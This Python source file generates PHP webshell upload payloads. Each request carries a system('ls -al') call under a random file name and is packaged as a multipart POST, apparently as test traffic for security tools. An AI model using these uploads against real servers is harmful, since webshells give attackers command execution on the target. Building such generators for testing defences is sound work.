# -*- coding: utf-8 -*-
from module import common
import os
import json
import random
from urllib.parse import quote,unquote

class webshell:

    common = None
    payloads = []

    def __init__(self, common=None):
        if (common != None):
            self.common = common

    def generate_payload(self, amount):
        phpwebshell_template_ori = '''<? a()=;<?php system("ls -al");'''
        for _ in range(amount):
            file_name = '{}.{}'.format(self.common.get_random_filename().split('.')[0],'xxx')
            phpwebshell_template = 'filename="{}"\r\n\r\n{}'.format(file_name, phpwebshell_template_ori)
            self.payloads.append(phpwebshell_template)

    def generate_packages(self, amount):
        self.generate_payload(amount)
        packages = [self.common.generate(self.payloads[i],
                                         method="POST",
                                         payload_location='body_parame',
                                         encoding='multipart') for i in range(amount)]
        return packages
